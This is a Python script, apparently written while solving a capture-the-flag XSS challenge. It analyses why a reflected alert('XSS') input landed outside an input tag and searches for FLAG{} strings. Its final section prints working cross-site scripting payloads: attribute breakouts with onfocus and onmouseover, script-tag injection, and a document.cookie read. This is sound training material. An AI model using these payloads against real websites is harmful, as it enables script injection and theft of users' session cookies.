import re
from html.parser import HTMLParser

# The provided HTML
html = '''
    <html>
        <head>
            <link rel="shortcut icon" href="static/assets/fav-icon.png">
            <link rel="stylesheet" type="text/css" href="static/css/style.css">
            <link rel="stylesheet" type="text/css" href="static/css/xss/xss25.css">
            <title>Dalgona - Star</title>
        </head>
        <article class="widget widget__login">
        <div class="widget__content">
            <div class="box">
                <form class="box-form" method="post">
                    <img class="text-img" src="static/img/logo5_white.png">
                    
                    <div class="solution-text"><img src="static/img/cookies/error_star.png" alt="Fail" width="150" height="150"><br>Failed! Try again!</div>
                    <input type=text name=solution placeholder="Enter solution..." > alert("XSS")>
                </form>
            </div>
        </div>
    </html>
'''

print("=" * 70)
print("XSS REFLECTION ANALYSIS REPORT")
print("=" * 70)

# 1. Find the line where 'alert("XSS")' appears
print("\n[1] FINDING alert(\"XSS\") IN HTML")
print("-" * 70)
lines = html.split('\n')
for i, line in enumerate(lines, 1):
    if 'alert("XSS")' in line:
        print(f"Line {i}: {line.strip()}")
        print(f"Position in line: {line.find('alert')} characters from start")

# 2. Analyze whether it's inside placeholder attribute or outside input tag
print("\n[2] ANALYSIS OF PAYLOAD LOCATION")
print("-" * 70)

# Extract the input tag and surrounding context
input_match = re.search(r'<input[^>]*>\s*alert\(\"XSS\"\)>', html)
if input_match:
    full_match = input_match.group(0)
    print("Full match found:")
    print(f"  {full_match}")
    print()
    
    # Separate input tag from payload
    input_tag_end = full_match.find('>') + 1
    input_tag = full_match[:input_tag_end]
    payload_part = full_match[input_tag_end:]
    
    print("INPUT TAG:")
    print(f"  {input_tag}")
    print()
    print("PAYLOAD LOCATION:")
    print(f"  The payload appears AFTER the input tag closes")
    print(f"  Payload text: '{payload_part}'")
    print()
    
    # Check if payload is inside any attribute
    if 'alert("XSS")' in input_tag:
        print("  STATUS: Payload is INSIDE the input tag")
        # Check which attribute
        for attr in ['placeholder', 'value', 'name', 'type']:
            if attr in input_tag and 'alert("XSS")' in input_tag:
                attr_match = re.search(f'{attr}=[^>]*alert\(\"XSS\"\)[^>]*', input_tag)
                if attr_match:
                    print(f"  SPECIFICALLY: Inside the '{attr}' attribute")
    else:
        print("  STATUS: Payload is OUTSIDE the input tag")
        print("  This means it's rendered as plain text on the page, not as JavaScript")

# 3. Look for FLAG{} pattern in the entire HTML
print("\n[3] SEARCHING FOR FLAG{} PATTERNS")
print("-" * 70)
flag_pattern = r'FLAG\{[^}]+\}'
flags = re.findall(flag_pattern, html)
if flags:
    print(f"Found {len(flags)} FLAG() pattern(s):")
    for i, flag in enumerate(flags, 1):
        print(f"  {i}. {flag}")
else:
    print("No FLAG{} patterns found in the HTML")

# 4. Explain why this payload isn't executing
print("\n[4] WHY THE PAYLOAD ISN'T EXECUTING")
print("-" * 70)
print("ANALYSIS:")
print("  The payload 'alert(\"XSS\")>' is rendered as literal text outside")
print("  the <input> tag. This means:")
print()
print("  ✓ It's not inside any executable context (like <script> tags)")
print("  ✓ It's not in an event handler attribute (onclick, onload, etc.)")
print("  ✓ It's not in a javascript: URL")
print("  ✓ It's just plain text content that gets displayed to the user")
print()
print("  The browser treats it as HTML text content, not JavaScript code.")
print("  For JavaScript to execute, the payload must be in a context that")
print("  the browser parses and executes as script.")

# 5. Suggest proper payload format
print("\n[5] PROPER PAYLOAD FORMAT FOR EXECUTION")
print("-" * 70)
print("CORRECT PAYLOAD EXAMPLES:")
print()
print("  Option 1 - Inside an event handler attribute:")
print('    <input type=text name=solution placeholder="Enter solution..." onfocus="alert(\'XSS\')">')
print()
print("  Option 2 - Breaking out of the placeholder attribute:")
print('    Input:    \" onfocus=\"alert(\'XSS\')')
print('    Result:   <input placeholder=\"Enter solution... \\" onfocus=\\"alert(\'XSS\')\">')
print('    Payload:  \" onfocus=\"alert(document.cookie)//')
print()
print("  Option 3 - Breaking out of the input tag completely:")
print('    Input:    \"><script>alert(\'XSS\')</script>')
print('    Result:   <input placeholder=\"Enter solution...\"><script>alert(\'XSS\')</script>')
print()
print("  Option 4 - Using HTML event handlers:")
print('    \" onmouseover=\"alert("XSS")')
print('    \" autofocus onfocus=\"alert("XSS")')
print()
print("  KEY PRINCIPLE: The payload must be in a context where browsers")
print("  will parse and execute it as JavaScript, not as plain text.")

print("\n" + "=" * 70)
print("ANALYSIS COMPLETE")
print("=" * 70)
